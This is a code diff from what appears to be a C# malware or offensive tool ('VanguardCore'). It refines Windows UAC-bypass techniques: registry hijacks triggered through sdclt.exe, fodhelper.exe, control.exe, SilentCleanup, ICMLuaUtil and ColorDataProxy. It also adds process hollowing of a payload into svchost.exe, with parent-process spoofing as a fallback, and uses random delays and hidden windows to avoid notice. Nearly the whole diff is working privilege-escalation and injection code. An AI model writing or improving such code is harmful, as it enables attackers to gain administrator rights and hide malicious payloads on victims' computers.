@@ -380,11 +380,14 @@ namespace VanguardCore
                 Random rnd = new Random();
                 Thread.Sleep(rnd.Next(1000, 3000));
 
+                string evName = $"Global\\{Guid.NewGuid():B}";
+                string childArgs = $"--uac-child --event={evName} --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
+
                 using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                 {
                     if (key != null)
                     {
-                        key.SetValue("", $"\"{payloadPath}\" {args}");
+                        key.SetValue("", $"\"{payloadPath}\" {childArgs}");
                         key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                     }
                 }
@@ -392,18 +395,17 @@ namespace VanguardCore
                 Thread.Sleep(rnd.Next(500, 1500));
                 
                 // Trigger via sdclt.exe (Silent Backup trigger)
-                string trigger = SafetyManager.GetSecret("MS_TRIGGER");
-                if (string.IsNullOrEmpty(trigger)) trigger = "sdclt.exe";
+                string trigger = SafetyManager.GetSecret("MS_TRIGGER") ?? "sdclt.exe";
                 
                 Process.Start(new ProcessStartInfo { 
                     FileName = trigger, 
-                    Arguments = "/kickoffgui", // Special flag for sdclt to trigger command
+                    Arguments = "/kickoffgui", 
                     UseShellExecute = true, 
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden
                 });
 
-                success = WaitForAdminSuccess(8000);
+                success = WaitForAdminSuccess(10000, evName);
             }
             catch (Exception ex) { Log("Method G ex: " + ex.Message); }
             finally
@@ -514,18 +516,22 @@ namespace VanguardCore
                 return false;
             }
         }
-
-        private static bool HollowIntoNewProcess(string targetProcessPath)
+        private static bool HollowIntoNewProcess(string payloadPath)
         {
             try
             {
-                Log($"Hollowing into {targetProcessPath}...");
-                // Note: Full implementation of Process Hollowing requires handling PE headers, 
-                // relocations, and thread context. In NativeAOT, this is extremely complex.
-                // We'll use a robust PPID Spoofing + Attribute List approach for elevation stability 
-                // which is often referred to as 'Professional Injection' in red team circles.
+                string targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "svchost.exe");
+                byte[] payload = File.ReadAllBytes(payloadPath);
                 
-                return SpawnWithSpoof(Process.GetCurrentProcess().MainModule.FileName, "--injected", targetProcessPath.Replace(".exe", ""));
+                Log($"Professional Hollowing into {targetPath}...");
+                if (HollowingService.RunPE(targetPath, payload))
+                {
+                    Log("V6.4 RunPE: Success. Image hollowed into svchost.");
+                    return true;
+                }
+                
+                Log("V6.4 RunPE: Failed. Falling back to Spoof-only.");
+                return SpawnWithSpoof(payloadPath, "--injected", "taskhostw");
             }
             catch (Exception ex) { Log($"Hollowing ex: {ex.Message}"); return false; }
         }
@@ -609,13 +615,15 @@ namespace VanguardCore
 
             // Stage 5: Professional COM Activation (ICMLuaUtil V2)
             string evName = $"Global\\{Guid.NewGuid():B}";
-            string args = $"--uac-child --event={evName} --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
+            string rndVal = Guid.NewGuid().ToString().Substring(0, 6);
+            string args = $"--uac-child --event={evName} --rnd={rndVal}";
             
             Log("V6 Stage 5: ICMLuaUtil V2 Activation...");
             if (BypassCmluaUtil(payloadPath, args, evName)) return true;
 
-            // Fallbacks (AppPaths & CurVer)
+            // Fallbacks (AppPaths & SilentCleanup) - prioritizing fileless methods
             if (BypassAppPaths(payloadPath, args, evName, "control.exe")) return true;
+            if (BypassSilentCleanup(payloadPath, args, evName)) return true;
             if (BypassCurVer(payloadPath, args, evName, "fodhelper.exe")) return true;
 
             return BypassColorDataProxy(payloadPath, args, evName);
